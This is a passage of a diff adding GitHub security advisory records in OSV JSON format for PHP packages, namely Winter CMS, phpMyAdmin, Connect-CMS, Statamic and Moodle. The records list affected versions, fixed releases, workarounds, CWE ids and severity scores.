`cms.manage_pages`, `cms.manage_layouts`, and `cms.manage_partials`.\n\nThis security issue has been fixed in [v1.2.13](https://github.com/wintercms/winter/commit/e09c8d3526f3583cb6c3476a021b885088ecd4bd) (Winter core) and [v1.2.13](https://github.com/wintercms/storm/commit/fd673f4f32140c97c68b1ed705764b819747fbdf) (Winter Storm).\n\n### Workarounds\n\nIf you cannot upgrade, apply https://github.com/wintercms/storm/commit/fd673f4f32140c97c68b1ed705764b819747fbdf and https://github.com/wintercms/winter/commit/e09c8d3526f3583cb6c3476a021b885088ecd4bd manually. As an interim mitigation, remove the `cms.manage_assets` permission from any role that is not held by a fully trusted administrator or developer, and audit existing theme `.js` assets for `=include` / `=require` directives that resolve outside the theme's own asset directory.\n\n### References\n\n- https://github.com/wintercms/winter/security/advisories/GHSA-58fp-mcx6-7qf9 — the LESS `@import` counterpart of this issue, which shares the same root cause and hardening approach.\n- https://github.com/wintercms/winter/security/advisories/GHSA-2x7r-93ww-cxrq (CVE-2023-52085) — earlier Local File Inclusion through LESS compilation.\n\nCredit to Zyad Mohamed Elmahy ([@elmahy111](https://github.com/elmahy111)) for reporting the issue.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Email us at [hello@wintercms.com](mailto:hello@wintercms.com)",
+    "affected": [
+      {
+        "package": {
+          "name": "winter/wn-system-module",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/winter/wn-system-module"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.2.13"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v1.0.473",
+          "v1.0.474",
+          "v1.0.475",
+          "v1.1.10",
+          "v1.1.11",
+          "v1.1.2",
+          "v1.1.3",
+          "v1.1.4",
+          "v1.1.5",
+          "v1.1.6",
+          "v1.1.7",
+          "v1.1.8",
+          "v1.1.9",
+          "v1.2.0",
+          "v1.2.1",
+          "v1.2.10",
+          "v1.2.11",
+          "v1.2.12",
+          "v1.2.2",
+          "v1.2.3",
+          "v1.2.4",
+          "v1.2.5",
+          "v1.2.6",
+          "v1.2.7",
+          "v1.2.8",
+          "v1.2.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-2223-f22x-24cq/GHSA-2223-f22x-24cq.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/wintercms/winter/security/advisories/GHSA-2223-f22x-24cq"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/wintercms/storm/commit/fd673f4f32140c97c68b1ed705764b819747fbdf"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/wintercms/winter/commit/e09c8d3526f3583cb6c3476a021b885088ecd4bd"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/wintercms/winter"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/wintercms/winter/releases/tag/v1.2.13"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-200",
+        "CWE-22"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-08-20T18:44:17Z",
+      "nvd_published_at": null,
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-222v-cx2c-q2f5",
+    "published": "2025-01-23T06:31:49Z",
+    "modified": "2025-11-03T23:05:57.939927Z",
+    "aliases": [
+      "BIT-phpmyadmin-2025-24530",
+      "CVE-2025-24530"
+    ],
+    "summary": "phpMyAdmin XSS when checking tables",
+    "details": "An issue was discovered in phpMyAdmin 5.x before 5.2.2. An XSS vulnerability has been discovered for the check tables feature. A crafted table or database name could be used for XSS.",
+    "affected": [
+      {
+        "package": {
+          "name": "phpmyadmin/phpmyadmin",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/phpmyadmin/phpmyadmin"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "5.0.0"
+              },
+              {
+                "fixed": "5.2.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "5.0.0",
+          "5.0.0.1",
+          "5.0.1",
+          "5.0.2",
+          "5.0.3",
+          "5.0.4",
+          "5.1.0",
+          "5.1.1",
+          "5.1.2",
+          "5.1.3",
+          "5.1.4",
+          "5.2.0",
+          "5.2.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-222v-cx2c-q2f5/GHSA-222v-cx2c-q2f5.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24530"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/phpmyadmin/phpmyadmin/commit/23c13a81709728089ff031e5b1c29b5e91baa6a7"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/phpmyadmin/phpmyadmin"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2025/04/msg00016.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.phpmyadmin.net/security/PMASA-2025-1"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-79"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-01-23T17:52:50Z",
+      "nvd_published_at": "2025-01-23T06:15:27Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2237-5r9w-vm8j",
+    "published": "2025-02-07T20:50:20Z",
+    "modified": "2025-02-07T21:01:08.594410Z",
+    "summary": "Connect-CMS information that is restricted to viewing is visible",
+    "details": "### Impact\n - Information that is restricted from viewing in the search results of site searches (※) can still be viewed via the main text (a feature added in v1.8.0).\n     - Impact by version\n         - v1.8.0 ~ v1.8.3: It will be displayed in the text.\n         - v1.8.0 and earlier: It will not be displayed in the body of the text, but the title (frame name) will be displayed with a link.\n     - Target viewing restriction function\n         - Frame publishing function (private, limited publishing)\n         - IP Restriction Page\n         - Password setting page\n\n### Patches (fixed version)\n - Apply v1.8.4.\n\n### Workarounds\n - Remove the site search (e.g. hide frames).。\n\n### References\nnone",
+    "affected": [
+      {
+        "package": {
+          "name": "opensource-workshop/connect-cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/opensource-workshop/connect-cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "1.8.4"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v0.0.1.20200106",
+          "v0.0.1.20200216",
+          "v0.0.1.20200302",
+          "v0.0.1.20200411",
+          "v0.0.1.20200510",
+          "v0.0.1.20200603",
+          "v0.0.1.20200716",
+          "v0.0.1.20200909",
+          "v0.0.1.20201008",
+          "v0.0.1.20201207",
+          "v0.0.1.20210104",
+          "v0.0.1.20210301",
+          "v0.0.1.20210405",
+          "v0.0.1.20211130",
+          "v0.0.1.20220207",
+          "v1.0.0",
+          "v1.1.0",
+          "v1.1.1",
+          "v1.1.2",
+          "v1.1.3",
+          "v1.2.0",
+          "v1.2.1",
+          "v1.2.2",
+          "v1.2.3",
+          "v1.2.4",
+          "v1.2.5",
+          "v1.2.6",
+          "v1.2.7",
+          "v1.2.8",
+          "v1.3.0",
+          "v1.3.1",
+          "v1.3.2",
+          "v1.4.0",
+          "v1.4.1",
+          "v1.4.2",
+          "v1.4.3",
+          "v1.4.4",
+          "v1.5.0",
+          "v1.5.1",
+          "v1.5.2",
+          "v1.5.3",
+          "v1.6.0",
+          "v1.6.1",
+          "v1.6.2",
+          "v1.7.0",
+          "v1.7.1",
+          "v1.7.2",
+          "v1.8.0",
+          "v1.8.1",
+          "v1.8.2",
+          "v1.8.3"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 1.8.3",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-2237-5r9w-vm8j/GHSA-2237-5r9w-vm8j.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-2237-5r9w-vm8j"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/opensource-workshop/connect-cms"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-200"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-02-07T20:50:20Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-225x-3jhx-wh4q",
+    "published": "2026-08-06T19:22:34Z",
+    "modified": "2026-08-06T19:41:01.486942Z",
+    "aliases": [
+      "CVE-2026-64664"
+    ],
+    "summary": "Statamic: Missing authorization on Control Panel endpoint allows disclosure of user existence",
+    "details": "### Impact\nAn authenticated Control Panel user could use an endpoint intended for the user creation wizard to determine if a given email address belongs to an existing user, without having permission to view users.\n\nThe endpoint only exposed user existence, not any of its data.\n\n### Patches\nThis has been fixed in 5.74.1 and 6.24.0.",
+    "affected": [
+      {
+        "package": {
+          "name": "statamic/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/statamic/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "5.74.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v3.0.0",
+          "v3.0.0-beta.1",
+          "v3.0.0-beta.10",
+          "v3.0.0-beta.11",
+          "v3.0.0-beta.12",
+          "v3.0.0-beta.13",
+          "v3.0.0-beta.14",
+          "v3.0.0-beta.15",
+          "v3.0.0-beta.16",
+          "v3.0.0-beta.17",
+          "v3.0.0-beta.18",
+          "v3.0.0-beta.19",
+          "v3.0.0-beta.2",
+          "v3.0.0-beta.20",
+          "v3.0.0-beta.21",
+          "v3.0.0-beta.22",
+          "v3.0.0-beta.23",
+          "v3.0.0-beta.24",
+          "v3.0.0-beta.25",
+          "v3.0.0-beta.26",
+          "v3.0.0-beta.27",
+          "v3.0.0-beta.28",
+          "v3.0.0-beta.29",
+          "v3.0.0-beta.3",
+          "v3.0.0-beta.30",
+          "v3.0.0-beta.31",
+          "v3.0.0-beta.32",
+          "v3.0.0-beta.33",
+          "v3.0.0-beta.34",
+          "v3.0.0-beta.35",
+          "v3.0.0-beta.36",
+          "v3.0.0-beta.37",
+          "v3.0.0-beta.38",
+          "v3.0.0-beta.39",
+          "v3.0.0-beta.4",
+          "v3.0.0-beta.40",
+          "v3.0.0-beta.41",
+          "v3.0.0-beta.42",
+          "v3.0.0-beta.43",
+          "v3.0.0-beta.44",
+          "v3.0.0-beta.45",
+          "v3.0.0-beta.46",
+          "v3.0.0-beta.5",
+          "v3.0.0-beta.6",
+          "v3.0.0-beta.7",
+          "v3.0.0-beta.8",
+          "v3.0.0-beta.9",
+          "v3.0.1",
+          "v3.0.10",
+          "v3.0.11",
+          "v3.0.12",
+          "v3.0.13",
+          "v3.0.14",
+          "v3.0.15",
+          "v3.0.16",
+          "v3.0.17",
+          "v3.0.18",
+          "v3.0.19",
+          "v3.0.2",
+          "v3.0.20",
+          "v3.0.21",
+          "v3.0.22",
+          "v3.0.23",
+          "v3.0.24",
+          "v3.0.25",
+          "v3.0.26",
+          "v3.0.27",
+          "v3.0.28",
+          "v3.0.29",
+          "v3.0.3",
+          "v3.0.30",
+          "v3.0.31",
+          "v3.0.32",
+          "v3.0.33",
+          "v3.0.34",
+          "v3.0.35",
+          "v3.0.35.1",
+          "v3.0.36",
+          "v3.0.36.1",
+          "v3.0.37",
+          "v3.0.38",
+          "v3.0.39",
+          "v3.0.4",
+          "v3.0.40",
+          "v3.0.41",
+          "v3.0.42",
+          "v3.0.43",
+          "v3.0.44",
+          "v3.0.45",
+          "v3.0.46",
+          "v3.0.47",
+          "v3.0.48",
+          "v3.0.49",
+          "v3.0.5",
+          "v3.0.6",
+          "v3.0.7",
+          "v3.0.8",
+          "v3.0.9",
+          "v3.1.0",
+          "v3.1.0-alpha.1",
+          "v3.1.0-alpha.2",
+          "v3.1.0-alpha.3",
+          "v3.1.0-alpha.4",
+          "v3.1.0-beta.1",
+          "v3.1.0-beta.2",
+          "v3.1.0-beta.3",
+          "v3.1.1",
+          "v3.1.10",
+          "v3.1.11",
+          "v3.1.12",
+          "v3.1.13",
+          "v3.1.14",
+          "v3.1.15",
+          "v3.1.16",
+          "v3.1.17",
+          "v3.1.18",
+          "v3.1.19",
+          "v3.1.2",
+          "v3.1.20",
+          "v3.1.21",
+          "v3.1.22",
+          "v3.1.23",
+          "v3.1.24",
+          "v3.1.25",
+          "v3.1.26",
+          "v3.1.27",
+          "v3.1.28",
+          "v3.1.29",
+          "v3.1.3",
+          "v3.1.30",
+          "v3.1.31",
+          "v3.1.32",
+          "v3.1.33",
+          "v3.1.34",
+          "v3.1.35",
+          "v3.1.4",
+          "v3.1.5",
+          "v3.1.6",
+          "v3.1.7",
+          "v3.1.8",
+          "v3.1.9",
+          "v3.2.0",
+          "v3.2.0-beta.1",
+          "v3.2.1",
+          "v3.2.10",
+          "v3.2.11",
+          "v3.2.12",
+          "v3.2.13",
+          "v3.2.14",
+          "v3.2.15",
+          "v3.2.16",
+          "v3.2.17",
+          "v3.2.18",
+          "v3.2.19",
+          "v3.2.2",
+          "v3.2.20",
+          "v3.2.21",
+          "v3.2.22",
+          "v3.2.23",
+          "v3.2.24",
+          "v3.2.25",
+          "v3.2.26",
+          "v3.2.27",
+          "v3.2.28",
+          "v3.2.29",
+          "v3.2.3",
+          "v3.2.30",
+          "v3.2.31",
+          "v3.2.32",
+          "v3.2.33",
+          "v3.2.34",
+          "v3.2.35",
+          "v3.2.36",
+          "v3.2.37",
+          "v3.2.38",
+          "v3.2.39",
+          "v3.2.4",
+          "v3.2.5",
+          "v3.2.6",
+          "v3.2.7",
+          "v3.2.8",
+          "v3.2.9",
+          "v3.3.0",
+          "v3.3.0-beta.1",
+          "v3.3.0-beta.2",
+          "v3.3.0-beta.3",
+          "v3.3.0-beta.4",
+          "v3.3.0-beta.5",
+          "v3.3.0-beta.6",
+          "v3.3.0-beta.7",
+          "v3.3.1",
+          "v3.3.10",
+          "v3.3.11",
+          "v3.3.12",
+          "v3.3.13",
+          "v3.3.14",
+          "v3.3.15",
+          "v3.3.16",
+          "v3.3.17",
+          "v3.3.18",
+          "v3.3.19",
+          "v3.3.2",
+          "v3.3.20",
+          "v3.3.21",
+          "v3.3.22",
+          "v3.3.23",
+          "v3.3.24",
+          "v3.3.25",
+          "v3.3.26",
+          "v3.3.27",
+          "v3.3.28",
+          "v3.3.29",
+          "v3.3.3",
+          "v3.3.30",
+          "v3.3.31",
+          "v3.3.32",
+          "v3.3.33",
+          "v3.3.34",
+          "v3.3.35",
+          "v3.3.36",
+          "v3.3.37",
+          "v3.3.38",
+          "v3.3.39",
+          "v3.3.4",
+          "v3.3.40",
+          "v3.3.41",
+          "v3.3.42",
+          "v3.3.43",
+          "v3.3.44",
+          "v3.3.45",
+          "v3.3.46",
+          "v3.3.47",
+          "v3.3.48",
+          "v3.3.49",
+          "v3.3.5",
+          "v3.3.50",
+          "v3.3.51",
+          "v3.3.52",
+          "v3.3.53",
+          "v3.3.54",
+          "v3.3.55",
+          "v3.3.56",
+          "v3.3.57",
+          "v3.3.58",
+          "v3.3.59",
+          "v3.3.6",
+          "v3.3.60",
+          "v3.3.61",
+          "v3.3.62",
+          "v3.3.63",
+          "v3.3.64",
+          "v3.3.65",
+          "v3.3.66",
+          "v3.3.67",
+          "v3.3.68",
+          "v3.3.7",
+          "v3.3.8",
+          "v3.3.9",
+          "v3.4.0",
+          "v3.4.1",
+          "v3.4.10",
+          "v3.4.11",
+          "v3.4.12",
+          "v3.4.13",
+          "v3.4.14",
+          "v3.4.15",
+          "v3.4.16",
+          "v3.4.17",
+          "v3.4.2",
+          "v3.4.3",
+          "v3.4.4",
+          "v3.4.5",
+          "v3.4.6",
+          "v3.4.7",
+          "v3.4.8",
+          "v3.4.9",
+          "v4.0.0",
+          "v4.0.0-alpha.1",
+          "v4.0.0-alpha.2",
+          "v4.0.0-alpha.3",
+          "v4.0.0-alpha.4",
+          "v4.0.0-alpha.5",
+          "v4.0.0-beta.1",
+          "v4.0.0-beta.2",
+          "v4.0.0-beta.3",
+          "v4.0.0-beta.4",
+          "v4.1.0",
+          "v4.1.1",
+          "v4.1.2",
+          "v4.1.3",
+          "v4.10.0",
+          "v4.10.1",
+          "v4.10.2",
+          "v4.11.0",
+          "v4.12.0",
+          "v4.13.0",
+          "v4.13.1",
+          "v4.13.2",
+          "v4.14.0",
+          "v4.15.0",
+          "v4.16.0",
+          "v4.17.0",
+          "v4.18.0",
+          "v4.19.0",
+          "v4.2.0",
+          "v4.20.0",
+          "v4.21.0",
+          "v4.22.0",
+          "v4.23.0",
+          "v4.23.1",
+          "v4.23.2",
+          "v4.24.0",
+          "v4.25.0",
+          "v4.26.0",
+          "v4.26.1",
+          "v4.27.0",
+          "v4.28.0",
+          "v4.29.0",
+          "v4.3.0",
+          "v4.30.0",
+          "v4.31.0",
+          "v4.32.0",
+          "v4.33.0",
+          "v4.34.0",
+          "v4.35.0",
+          "v4.36.0",
+          "v4.37.0",
+          "v4.38.0",
+          "v4.39.0",
+          "v4.4.0",
+          "v4.40.0",
+          "v4.41.0",
+          "v4.42.0",
+          "v4.42.1",
+          "v4.43.0",
+          "v4.44.0",
+          "v4.45.0",
+          "v4.46.0",
+          "v4.47.0",
+          "v4.48.0",
+          "v4.49.0",
+          "v4.5.0",
+          "v4.50.0",
+          "v4.51.0",
+          "v4.52.0",
+          "v4.53.0",
+          "v4.53.1",
+          "v4.53.2",
+          "v4.54.0",
+          "v4.55.0",
+          "v4.56.0",
+          "v4.56.1",
+          "v4.57.0",
+          "v4.57.1",
+          "v4.57.2",
+          "v4.57.3",
+          "v4.58.0",
+          "v4.58.1",
+          "v4.58.2",
+          "v4.58.3",
+          "v4.6.0",
+          "v4.7.0",
+          "v4.8.0",
+          "v4.9.0",
+          "v4.9.1",
+          "v4.9.2",
+          "v5.0.0",
+          "v5.0.0-alpha.1",
+          "v5.0.0-alpha.2",
+          "v5.0.0-alpha.3",
+          "v5.0.0-alpha.4",
+          "v5.0.0-alpha.5",
+          "v5.0.0-alpha.6",
+          "v5.0.0-beta.1",
+          "v5.0.0-beta.2",
+          "v5.0.0-beta.3",
+          "v5.0.0-beta.4",
+          "v5.0.1",
+          "v5.0.2",
+          "v5.1.0",
+          "v5.10.0",
+          "v5.11.0",
+          "v5.12.0",
+          "v5.13.0",
+          "v5.14.0",
+          "v5.15.0",
+          "v5.16.0",
+          "v5.17.0",
+          "v5.17.1",
+          "v5.18.0",
+          "v5.19.0",
+          "v5.2.0",
+          "v5.20.0",
+          "v5.21.0",
+          "v5.22.0",
+          "v5.22.1",
+          "v5.23.0",
+          "v5.24.0",
+          "v5.25.0",
+          "v5.26.0",
+          "v5.27.0",
+          "v5.28.0",
+          "v5.29.0",
+          "v5.3.0",
+          "v5.30.0",
+          "v5.31.0",
+          "v5.32.0",
+          "v5.33.0",
+          "v5.33.1",
+          "v5.34.0",
+          "v5.35.0",
+          "v5.36.0",
+          "v5.37.0",
+          "v5.38.0",
+          "v5.38.1",
+          "v5.39.0",
+          "v5.4.0",
+          "v5.40.0",
+          "v5.41.0",
+          "v5.42.0",
+          "v5.42.1",
+          "v5.43.0",
+          "v5.43.1",
+          "v5.43.2",
+          "v5.44.0",
+          "v5.45.0",
+          "v5.45.1",
+          "v5.45.2",
+          "v5.46.0",
+          "v5.46.1",
+          "v5.47.0",
+          "v5.48.0",
+          "v5.48.1",
+          "v5.49.0",
+          "v5.49.1",
+          "v5.5.0",
+          "v5.50.0",
+          "v5.51.0",
+          "v5.52.0",
+          "v5.53.0",
+          "v5.53.1",
+          "v5.54.0",
+          "v5.55.0",
+          "v5.56.0",
+          "v5.57.0",
+          "v5.58.0",
+          "v5.58.1",
+          "v5.59.0",
+          "v5.6.0",
+          "v5.6.1",
+          "v5.6.2",
+          "v5.60.0",
+          "v5.61.0",
+          "v5.62.0",
+          "v5.63.0",
+          "v5.64.0",
+          "v5.65.0",
+          "v5.65.1",
+          "v5.65.2",
+          "v5.66.0",
+          "v5.67.0",
+          "v5.68.0",
+          "v5.69.0",
+          "v5.7.0",
+          "v5.7.1",
+          "v5.7.2",
+          "v5.7.3",
+          "v5.70.0",
+          "v5.71.0",
+          "v5.72.0",
+          "v5.73.0",
+          "v5.73.1",
+          "v5.73.10",
+          "v5.73.11",
+          "v5.73.12",
+          "v5.73.13",
+          "v5.73.14",
+          "v5.73.15",
+          "v5.73.16",
+          "v5.73.17",
+          "v5.73.18",
+          "v5.73.19",
+          "v5.73.2",
+          "v5.73.20",
+          "v5.73.21",
+          "v5.73.22",
+          "v5.73.23",
+          "v5.73.24",
+          "v5.73.3",
+          "v5.73.4",
+          "v5.73.5",
+          "v5.73.6",
+          "v5.73.7",
+          "v5.73.8",
+          "v5.73.9",
+          "v5.74.0",
+          "v5.8.0",
+          "v5.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-225x-3jhx-wh4q/GHSA-225x-3jhx-wh4q.json"
+        }
+      },
+      {
+        "package": {
+          "name": "statamic/cms",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/statamic/cms"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "6.0.0"
+              },
+              {
+                "fixed": "6.24.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v6.0.0",
+          "v6.1.0",
+          "v6.10.0",
+          "v6.11.0",
+          "v6.12.0",
+          "v6.13.0",
+          "v6.14.0",
+          "v6.15.0",
+          "v6.16.0",
+          "v6.17.0",
+          "v6.18.0",
+          "v6.18.1",
+          "v6.19.0",
+          "v6.2.0",
+          "v6.2.1",
+          "v6.2.2",
+          "v6.2.3",
+          "v6.2.4",
+          "v6.2.5",
+          "v6.20.0",
+          "v6.20.1",
+          "v6.20.2",
+          "v6.20.3",
+          "v6.21.0",
+          "v6.22.0",
+          "v6.23.0",
+          "v6.3.0",
+          "v6.3.1",
+          "v6.3.2",
+          "v6.3.3",
+          "v6.4.0",
+          "v6.4.1",
+          "v6.5.0",
+          "v6.6.0",
+          "v6.6.1",
+          "v6.6.2",
+          "v6.6.3",
+          "v6.7.0",
+          "v6.7.1",
+          "v6.7.2",
+          "v6.7.3",
+          "v6.8.0",
+          "v6.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-225x-3jhx-wh4q/GHSA-225x-3jhx-wh4q.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/security/advisories/GHSA-225x-3jhx-wh4q"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/pull/14905"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/commit/aea68053cedab5c79d10102820b57345a7d7102e"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/statamic/cms"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/releases/tag/v5.74.1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/statamic/cms/releases/tag/v6.24.0"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-200",
+        "CWE-862"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-08-06T19:22:34Z",
+      "nvd_published_at": null,
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-22gj-8qj2-fj46",
+    "published": "2023-05-02T21:31:48Z",
+    "modified": "2026-09-10T03:50:01.149588711Z",
+    "aliases": [
+      "BIT-moodle-2023-30943",
+      "CVE-2023-30943"
+    ],
+    "summary": "Moodle External Control of File Name or Path vulnerability",
+    "details": "The vulnerability was found Moodle which exists because the application allows a user to control path of the older to create in TinyMCE loaders. A remote user can send a specially crafted HTTP request and create arbitrary folders on the system.",
+    "affected": [
+      {
+        "package": {
+          "name": "moodle/moodle",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/moodle/moodle"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "4.2.0-rc2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v2.3.10",
+          "v2.3.11",
+          "v2.3.4",
+          "v2.3.5",
+          "v2.3.6",
+          "v2.3.7",
+          "v2.3.8",
+          "v2.3.9",
+          "v2.4.0",
+          "v2.4.0-rc1",
+          "v2.4.1",
+          "v2.4.10",
+          "v2.4.11",
+          "v2.4.2",
+          "v2.4.3",
+          "v2.4.4",
+          "v2.4.5",
+          "v2.4.6",
+          "v2.4.7",
+          "v2.4.8",
+          "v2.4.9",
+          "v2.5.0",
+          "v2.5.0-beta",
+          "v2.5.0-rc1",
+          "v2.5.1",
+          "v2.5.2",
+          "v2.5.3",
+          "v2.5.4",
+          "v2.5.5",
+          "v2.5.6",
+          "v2.5.7",
+          "v2.5.8",
+          "v2.5.9",
+          "v2.6.0",
+          "v2.6.0-beta",
+          "v2.6.0-rc1",
+          "v2.6.1",
+          "v2.6.10",
+          "v2.6.11",
+          "v2.6.2",
+          "v2.6.3",
+          "v2.6.4",
+          "v2.6.5",
+          "v2.6.6",
+          "v2.6.7",
+          "v2.6.8",
+          "v2.6.9",
+          "v2.7.0",
+          "v2.7.0-beta",
+          "v2.7.0-rc1",
+          "v2.7.0-rc2",
+          "v2.7.1",
+          "v2.7.10",
+          "v2.7.11",
+          "v2.7.12",
+          "v2.7.13",
+          "v2.7.14",
+          "v2.7.15",
+          "v2.7.16",
+          "v2.7.17",
+          "v2.7.18",
+          "v2.7.19",
+          "v2.7.2",
+          "v2.7.20",
+          "v2.7.3",
+          "v2.7.4",
+          "v2.7.5",
+          "v2.7.6",
+          "v2.7.7",
+          "v2.7.8",
+          "v2.7.9",
+          "v2.8.0",
+          "v2.8.0-beta",
+          "v2.8.0-rc1",
+          "v2.8.0-rc2",
+          "v2.8.1",
+          "v2.8.10",
+          "v2.8.11",
+          "v2.8.12",
+          "v2.8.2",
+          "v2.8.3",
+          "v2.8.4",
+          "v2.8.5",
+          "v2.8.6",
+          "v2.8.7",
+          "v2.8.8",
+          "v2.8.9",
+          "v2.9.0",
+          "v2.9.0-beta",
+          "v2.9.0-rc1",
+          "v2.9.0-rc2",
+          "v2.9.1",
+          "v2.9.2",
+          "v2.9.3",
+          "v2.9.4",
+          "v2.9.5",
+          "v2.9.6",
+          "v2.9.7",
+          "v2.9.8",
+          "v2.9.9",
+          "v3.0.0",
+          "v3.0.0-beta",
+          "v3.0.0-rc1",
+          "v3.0.0-rc2",
+          "v3.0.0-rc3",
+          "v3.0.0-rc4",
+          "v3.0.1",
+          "v3.0.10",
+          "v3.0.2",
+          "v3.0.3",
+          "v3.0.4",
+          "v3.0.5",
+          "v3.0.6",
+          "v3.0.7",
+          "v3.0.8",
+          "v3.0.9",
+          "v3.1.0",
+          "v3.1.0-beta",
+          "v3.1.0-rc1",
+          "v3.1.0-rc2",
+          "v3.1.1",
+          "v3.1.10",
+          "v3.1.11",
+          "v3.1.12",
+          "v3.1.13",
+          "v3.1.14",
+          "v3.1.15",
+          "v3.1.16",
+          "v3.1.17",
+          "v3.1.18",
+          "v3.1.2",
+          "v3.1.3",
+          "v3.1.4",
+          "v3.1.5",
+          "v3.1.6",
+          "v3.1.7",
+          "v3.1.8",
+          "v3.1.9",
+          "v3.10.0",
+          "v3.10.0-beta",
+          "v3.10.0-rc1",
+          "v3.10.0-rc2",
+          "v3.10.1",
+          "v3.10.10",
+          "v3.10.11",
+          "v3.10.2",
+          "v3.10.3",
+          "v3.10.4",
+          "v3.10.5",
+          "v3.10.6",
+          "v3.10.7",
+          "v3.10.8",
+          "v3.10.9",
+          "v3.11.0",
+          "v3.11.0-beta",
+          "v3.11.0-rc1",
+          "v3.11.0-rc2",
+          "v3.11.1",
+          "v3.11.10",
+          "v3.11.11",
+          "v3.11.12",
+          "v3.11.13",
+          "v3.11.14",
+          "v3.11.15",
+          "v3.11.16",
+          "v3.11.17",
+          "v3.11.18",
+          "v3.11.2",
+          "v3.11.3",
+          "v3.11.4",
+          "v3.11.5",
+          "v3.11.6",
+          "v3.11.7",
+          "v3.11.8",
+          "v3.11.9",
+          "v3.2.0",
+          "v3.2.0-beta",
+          "v3.2.0-rc1",
+          "v3.2.0-rc2",
+          "v3.2.0-rc3",
+          "v3.2.0-rc4",
+          "v3.2.0-rc5",
+          "v3.2.1",
+          "v3.2.2",
+          "v3.2.3",
+          "v3.2.4",
+          "v3.2.5",
